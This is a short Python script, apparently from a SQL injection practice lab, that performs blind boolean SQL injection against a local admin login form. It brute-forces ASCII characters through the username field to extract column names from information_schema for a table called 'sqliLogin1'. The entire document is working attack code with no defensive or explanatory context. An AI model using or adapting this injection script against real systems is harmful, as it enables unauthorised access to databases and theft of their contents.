import requests
URL = "http://localhost/adminlogin.php"
min = 48 # '1'
max = 122 # 'z'
column_LEN = [2,2] # length of each column
colname = []

for i in range(len(column_LEN)):
	result = ""
	for idx in range(1, column_LEN[i]+1):
		for cnt in range(min, max+1):
			sqlquery = "' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='sqliLogin1' limit "+ str(i) + ",1),"+ str(idx) +",1)) = "+ str(cnt) +"# "
			postquery = "username=" + sqlquery + "&password=1&form=submit"
			res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})

			if "SUCCESS" in res.text:
				print(f"Catch one! {cnt}")
				result = result + chr(cnt)
				break
	colname.append(result)

print(f"COLUMN NAME is {colname}")
